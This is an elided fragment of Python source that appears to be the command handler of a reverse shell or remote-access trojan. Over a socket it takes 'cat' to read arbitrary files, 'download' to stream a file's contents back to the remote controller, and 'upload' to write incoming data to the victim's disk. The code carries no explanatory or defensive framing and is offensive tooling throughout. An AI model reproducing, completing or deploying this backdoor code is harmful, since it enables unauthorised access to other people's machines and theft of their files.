...
while True:
    ...
    if len(data) > 0:
        ...
        elif data.decode("utf-8")[:3] == "cat":
            try:
                contents = Path(data.decode("utf-8")[4:]).read_text()
                std_err = contents
            except:
                std_err = "[*] Couldnt open file"          

        elif data.decode("utf-8")[:8] == "download":
            try:
                file = open(os.path.join(".",data.decode("utf-8")[9:]), 'rb')
                for line in file:
                    s.send(line)
                    time.sleep(0.05)
                file.close()
        ...
        elif data.decode("utf-8")[:6] == "upload":
            try:
                with open(os.path.join(".", data.decode("utf-8")[7:]), 'wb') as f:
                    print("[*] File opened")
                    while True:
